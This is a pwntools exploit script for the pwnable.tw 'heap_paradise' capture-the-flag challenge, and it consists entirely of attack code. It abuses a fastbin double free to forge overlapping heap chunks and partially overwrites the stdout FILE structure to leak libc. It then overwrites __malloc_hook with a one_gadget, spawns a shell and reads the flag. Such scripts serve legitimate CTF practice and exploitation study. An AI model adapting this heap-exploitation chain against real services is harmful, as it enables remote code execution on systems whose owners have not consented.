#!/usr/bin/env python3
from pwn import *

PORT = 10308
HOST = "chall.pwnable.tw"

elf = context.binary = ELF('./heap_paradise_patched', checksec=False)
libc = ELF('./libc.so.6', checksec=False)
# ld = ELF('./ld-linux-x86-64.so.2', checksec=False)

def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''
            set resolve-heap-via-heuristic force
            brva 0x0000000000000CF4
            brva 0x0000000000000DCD
            c
            set follow-fork-mode parent
            ''')

def conn():
    if args.REMOTE:
        return remote(HOST, PORT)
    else:
        return elf.process()

def sla(pr, dt): p.sendlineafter(pr, dt)
def sa(pr, dt): p.sendafter(pr, dt)

def alloc(sz, dt):
    sla(b'You Choice:', b'1')
    sla(b'Size :', str(sz).encode())
    sa(b'Data :', dt)

def free(idx):
    sla(b'You Choice:', b'2')
    sla(b'Index :', str(idx).encode())

# Stage 1: Leak libc

def leak_libc():
    alloc(0x68, flat(0, 0, 0, 0x71)) 
    alloc(0x68,
        flat({
            0x18: 0x21,
            0x48: 0x21
            }, filler='\x00')
        )

    free(0)
    free(1)
    free(0)

    alloc(0x68, p8(0x20)) # fake chunk
    alloc(0x68, b'dump')
    alloc(0x68, b'dump')
    alloc(0x68, b'fake_chunk') #5

    free(0)
    alloc(0x68, flat(0, 0, 0, 0xa1))


    free(5)

    free(0)
    free(1)

    alloc(
        0x78,
        flat({
            0x48: 0x71,
            0x50: p8(0xa0)
        }, filler='\x00')
    )
    target = libc.sym._IO_2_1_stdout_ - 0x43
    alloc(
        0x68,
        flat({
            0x28: 0x71,
            0x30: p16(target & 0xffff)
            }, filler='\x00')
    )

    alloc(0x68, p16(target & 0xffff))

    pl = b'\x00'*3 + flat({
            0x30: p64(0xfbad1800),
            0x50: p8(0x80)
        }, filler = b'\x00')
    # GDB()
    alloc(0x68, pl) # _IO_2_1_stdout_ - 0x33 
    first = p.recvn(8)
    leak  = p.recvn(8)

    if first != b'\x00'*8:
        raise EOFError('bad stdout partial overwrite')
    stdin_leak = u64(leak)
    libc.address = stdin_leak - libc.sym._IO_2_1_stdin_

    if libc.address & 0xfff != 0:
        raise EOFError('bad libc alignment')

    log.success(f'_IO_2_1_stdin_ leak: {hex(stdin_leak)}')
    log.success(f'libc_base: {hex(libc.address)}')

while True:
    p = conn()
    try:
        leak_libc()
        break
    except EOFError as e:
        log.warning(f'retry: {e}')
        try:
            p.close()
        except Exception:
            pass
        continue

# Stage 2: Overwrite __malloc_hook

malloc_hook = libc.sym.__malloc_hook - 0x23
log.info(f'target: {hex(malloc_hook)}')

free(5)
free(0)
free(1)

# GDB()
alloc(
    0x78,
    flat({
        0x48: 0x71,
        0x50: malloc_hook
    }, filler='\x00')
)

og = libc.address + 0xef6c4
alloc(0x68, b'A')

alloc(0x68, 
    b'A'*(0x10+3) + p64(og)
)

sla(b'You Choice:', b'1')
sla(b'Size :', b'10')

p.sendline(b'cat home/heap_paradise/flag')
p.interactive()

